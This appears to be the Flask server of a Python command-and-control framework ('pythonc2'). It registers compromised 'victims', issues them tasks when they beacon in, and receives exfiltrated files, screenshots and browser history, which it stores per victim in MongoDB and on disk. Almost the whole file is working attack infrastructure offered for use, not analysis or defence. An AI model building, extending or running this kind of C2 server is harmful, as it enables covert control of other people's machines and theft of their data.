from flask import Flask,request
from pathlib import Path
from lib.database import Database
from lib.task import Task
from lib.victim import Victim
import  os
import pymongo
import logging
import pdb
import base64

import pdb
import time


def main(db_object):
	app = Flask('app')

	## Get the cookie/victim ID from a request
	def get_cookie(request):
		d = request.cookies
		if d:
			return base64.b64decode(d.to_dict()['session']).decode()
		else:
			return False


	def get_victim_info(request):
		return request.form.to_dict()


	## Insert the command output in the Database
	def insert_cmd_output(output,victim_id,task_id):
		mydb = myclient["pythonc2"]
		cmds = mydb["commands"]
		h = {'victim_id':victim_id,'task_id':task_id}
		cmds.find_one_and_update(h,{ "$set": { "output": output } })



	####################################### General beacon and sends task  ####################################

	@app.route('/',methods = ['GET', 'POST'])
	def run():
		myclient = db_object.mongoclient
		if request.method == 'GET':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			
			victim_id = get_cookie(request)

			## Update last seen
			if victim_id:
				if victim_id in Victim.victims.keys():
					victim_obj = Victim.victims[victim_id]
					victim_obj.update_last_seen_to_db()
					print(f"Updates last seen of {victim_obj.victim_id}")

			task = Task.find_unissued_task(victim_id)

			## If there is any task
			if task:
				task_obj = Task.load_task(task)
				task_dict = task_obj.issue_dict()
				
				return task_dict

			## Default reply of server incase no commands
			return 'Nothing Fishy going on here :)'

		## Not needed remove.
		if request.method == 'POST':

			print("Command to exfiltrate recieved...")
			if not os.path.exists('./exfiltration'):
				os.mkdir('./exfiltration')
			## wb enables to write bianry
			with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
				# Write bytes to file
				f.write(request.data)
			f.close()
			return "OK"

	####################################### Task output handler  ####################################

	@app.route('/<cmd>/output/<task_id>',methods = ['POST'])


	def task_output(cmd,task_id):
		if request.method == 'POST':
			victim_id = get_cookie(request)

			## Handling for various kind of tasks
			if cmd == 'screenshot':

				## Dumping path
				dump_path = os.path.join(os.getcwd(),'victim_data',victim_id)
				if not os.path.exists(dump_path):
					os.makedirs(dump_path)
				ss_path = os.path.join(dump_path,"screenshot_"+time.strftime("%Y%m%d-%H%M%S")+".png")

				## Screenshot is base64 encoded
				b64encoded_string = request.data
				decoded_string = base64.b64decode(b64encoded_string)
				


				## Dump the screenshot
				with open(ss_path, "wb") as f:
					f.write(decoded_string)
				f.close()

				output = 'Screeshot saved to '+ss_path
			elif cmd == 'browser_history':

				## Comes as a bytes object, so changing to string
				output = request.data.decode('utf-8')
			else:
				## Not a valid cmd,, Do something?? TODO
				pass
			
			task_obj = Task.tasks[task_id]
			task_obj.insert_cmd_output(output)

			return "OK"

		
	####################################### Staging / Initial request from the victim  ####################################

	@app.route('/stage_0',methods = ['POST'])
	def stage():
		if request.method == 'POST':
			myclient = db_object.mongoclient

			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			victims = mydb['victims']


			## Get the victim id of the new victim
			victim_id = get_cookie(request)

			## Get the other info about the victim
			info = get_victim_info(request)
			

			if victim_id:
				## instantiate a new victim object
				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'])


				if victim_obj:
					return ('Victim registered', 200)
				else:
					return ('Victim already registered', 302)

			return ('Bad request', 400)


	####################################### Client Error Recieved  ####################################

	@app.route('/clienterror',methods = ['POST'])
	def clienterror():
		if request.method == 'POST':
			print(f"Recieved error from victim - {request.data.decode('utf-8')}")

			return ('Error Recieved, we will get back to you', 200)

	app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
	db_object = Database(url="mongodb://localhost:27017/")
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient
	main(db_object)